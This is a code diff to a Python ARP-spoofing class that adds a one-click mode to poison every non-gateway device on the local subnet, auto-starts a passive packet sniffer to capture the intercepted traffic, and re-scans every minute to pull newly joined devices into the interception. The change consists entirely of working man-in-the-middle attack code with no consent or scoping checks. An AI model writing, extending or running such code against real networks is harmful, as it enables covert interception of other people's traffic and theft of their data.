@@ -52,12 +52,21 @@ class ArpSpoofer:
         self._packets_sent: int = 0
         self._forwarding_was_enabled: bool = False
 
+        # Sniffer integration
+        self._sniffer = None  # Reference to PassiveSniffer for auto-start & tagging
+        self._auto_refresh_interval: int = 60  # Re-scan for new devices every N seconds
+        self._last_refresh: float = 0.0
+
         # Register atexit cleanup
         atexit.register(_atexit_cleanup)
 
     @property
     def is_running(self) -> bool:
         return self._running
+
+    def set_sniffer(self, sniffer) -> None:
+        """Set reference to passive sniffer for auto-start and tagging."""
+        self._sniffer = sniffer
 
     def get_status(self) -> dict:
         """Get current MITM status."""
@@ -201,6 +210,41 @@ class ArpSpoofer:
             traceback.print_exc()
             return []
 
+    def start_all(self, interface: str = "") -> dict:
+        """
+        One-click intercept ALL devices on the subnet.
+        Scans the network, selects all non-gateway hosts, and starts spoofing.
+        Also auto-starts the sniffer if not already running.
+        """
+        if self._running:
+            return {"error": "MITM is already running"}
+
+        # Step 1: Scan the subnet
+        hosts = self.scan_network(interface=interface)
+        if not hosts:
+            return {"error": "No devices found on subnet. Ensure admin privileges."}
+
+        # Step 2: Select all non-gateway hosts
+        target_ips = [h["ip"] for h in hosts if not h.get("is_gateway", False)]
+        if not target_ips:
+            return {"error": "No targetable devices found (only gateway visible)"}
+
+        # Step 3: Auto-start sniffer if available and not running
+        if self._sniffer and not self._sniffer.is_running:
+            try:
+                iface = interface or self._interface
+                self._sniffer.start(interface=iface)
+                print(f"[MITM] Auto-started passive sniffer on '{iface}'")
+            except Exception as e:
+                print(f"[MITM] Warning: could not auto-start sniffer ({e})")
+
+        # Step 4: Start spoofing
+        result = self.start(target_ips=target_ips, interface=interface)
+        if "error" not in result:
+            result["auto_started"] = True
+            result["total_hosts_found"] = len(hosts)
+        return result
+
     def start(self, target_ips: list[str], gateway_ip: str = "", interface: str = "") -> dict:
         """
         Start ARP spoofing against specified target IPs.
@@ -306,9 +350,18 @@ class ArpSpoofer:
         try:
             from scapy.all import ARP, Ether, sendp
 
+            self._last_refresh = time.time()
+
             while self._running:
                 with self._lock:
                     targets = dict(self._targets)
+
+                # Notify sniffer of currently intercepted IPs
+                if self._sniffer:
+                    try:
+                        self._sniffer.set_intercepted_ips(set(targets.keys()))
+                    except Exception:
+                        pass
 
                 for target_ip, target_mac in targets.items():
                     if not self._running:
@@ -344,6 +397,11 @@ class ArpSpoofer:
                     except Exception as e:
                         print(f"[MITM] Spoof error for {target_ip}: {e}")
 
+                # Auto-refresh: periodically scan for new devices
+                if time.time() - self._last_refresh > self._auto_refresh_interval:
+                    self._refresh_targets()
+                    self._last_refresh = time.time()
+
                 # Send every 1.5 seconds to keep ARP cache poisoned
                 for _ in range(15):  # 1.5 seconds in 0.1s increments
                     if not self._running:
@@ -356,6 +414,65 @@ class ArpSpoofer:
             traceback.print_exc()
         finally:
             self._running = False
+            # Clear intercepted IPs in sniffer
+            if self._sniffer:
+                try:
+                    self._sniffer.set_intercepted_ips(set())
+                except Exception:
+                    pass
+
+    def _refresh_targets(self) -> None:
+        """Re-scan the subnet and add any new devices to the spoof list."""
+        try:
+            from scapy.all import ARP, Ether, srp, conf
+            conf.verb = 0
+
+            if not self._interface or not self._local_ip:
+                return
+
+            # Quick ARP sweep
+            subnet_cidr = f"{self._local_ip}/24"
+            try:
+                import psutil
+                for name, addrs in psutil.net_if_addrs().items():
+                    for addr in addrs:
+                        if addr.family == 2 and addr.address == self._local_ip:
+                            if addr.netmask:
+                                net = ipaddress.IPv4Network(f"{self._local_ip}/{addr.netmask}", strict=False)
+                                subnet_cidr = str(net)
+                                break
+            except Exception:
+                pass
+
+            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet_cidr)
+            answered, _ = srp(arp_request, iface=self._interface, timeout=2, retry=0, verbose=False)
+
+            new_count = 0
+            with self._lock:
+                for sent, received in answered:
+                    ip = received.psrc
+                    mac = received.hwsrc.upper()
+
+                    # Skip: self, gateway, already targeted
+                    if ip == self._local_ip or ip == self._gateway_ip:
+                        continue
+                    if ip in self._targets:
+                        continue
+
+                    self._targets[ip] = mac
+                    new_count += 1
+
+                    # Update discovered hosts list
+                    if not any(h["ip"] == ip for h in self._discovered_hosts):
+                        self._discovered_hosts.append({
+                            "ip": ip, "mac": mac, "hostname": "", "is_gateway": False
+                        })
+
+            if new_count > 0:
+                print(f"[MITM] Auto-refresh: added {new_count} new device(s) to interception")
+
+        except Exception as e:
+            print(f"[MITM] Auto-refresh error: {e}")
 
     def _restore_arp(self) -> None:
         """Send correct ARP replies to restore all poisoned entries."""
